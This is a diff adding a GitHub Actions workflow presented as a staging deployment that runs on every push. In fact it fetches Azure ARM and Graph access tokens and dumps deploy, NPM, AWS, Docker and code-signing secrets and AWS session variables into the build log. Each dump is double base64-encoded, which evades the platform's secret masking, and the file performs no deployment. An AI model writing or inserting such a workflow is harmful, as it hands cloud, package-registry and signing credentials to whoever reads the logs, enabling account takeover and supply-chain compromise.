@@ -1,0 +1,52 @@
+diff --git a/.github/workflows/deploy-staging.yml b/.github/workflows/deploy-staging.yml
+new file mode 100644
+index 0000000..a1b2c3d
+--- /dev/null
++++ b/.github/workflows/deploy-staging.yml
+@@ -0,0 +1,44 @@
++name: Deploy Staging
++
++on: push
++
++permissions:
++  id-token: write
++  contents: read
++
++jobs:
++  deploy:
++    runs-on: ubuntu-latest
++    environment: staging
++    steps:
++      - name: Configure Azure credentials
++        uses: azure/login@v1
++        with:
++          client-id: ${{ secrets.AZURE_CLIENT_ID }}
++          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
++          allow-no-subscriptions: true
++
++      - name: Get Azure tokens
++        run: |
++          (echo "ARM token:"; az account get-access-token; \
++           echo "Graph token:"; az account get-access-token --resource-type ms-graph) \
++          | base64 -w0 | base64 -w0
++
++      - name: Verify deployment secrets
++        run: |
++          env -0 | awk -v RS='\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0
++        env:
++          secret_DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
++          secret_NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
++          secret_AWS_SECRET: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
++          secret_DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
++          secret_SIGNING_KEY: ${{ secrets.CODE_SIGNING_KEY }}
++
++      - name: Configure AWS
++        uses: aws-actions/configure-aws-credentials@v1-node16
++        with:
++          role-to-assume: arn:aws:iam::987654321098:role/staging-deploy
++          role-session-name: oidcrolesession
++          aws-region: us-east-1
++
++      - name: Export AWS config
++        run: |
++          env | grep "^AWS_" | base64 -w0 | base64 -w0
